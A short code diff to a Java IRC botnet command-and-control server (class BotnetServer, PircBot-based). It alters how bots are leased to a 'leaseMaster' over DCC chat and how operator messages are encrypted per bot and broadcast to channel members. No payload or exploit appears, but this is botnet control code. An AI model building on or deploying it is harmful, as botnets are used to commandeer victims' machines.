@@ -228,7 +228,7 @@ public class BotnetServer extends PircBot {
 				long duration = Long.parseLong(parts[2]);
 				String[] bots = chooseBots(parts, 3);
 				System.out.println(Arrays.toString(parts));
-				DccChat chat = dccSendChatRequest(leaseMaster, TIMEOUT);
+				DccChat chat = this.dccSendChatRequest(leaseMaster, TIMEOUT);
 				String botNames = bots[0];
 				for (String name : bots) {
 					botNames += " " + name;
@@ -357,9 +357,13 @@ public class BotnetServer extends PircBot {
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			// TODO: encrypt s.substring
-			String[] bots = getUserNames();
-			for (String name : bots) {
-				sendMessage(name, botKeys.get(name).encryptMsg(s.substring(1)));
+			User[] bots = getUsers(CHANNEL);
+			for (User bot : bots) {
+				if (botKeys.containsKey(bot.getNick())) {
+					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1)));
+				} else {
+					sendMessage(bot.getNick(), s.substring(1));
+				}
 			}
 			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
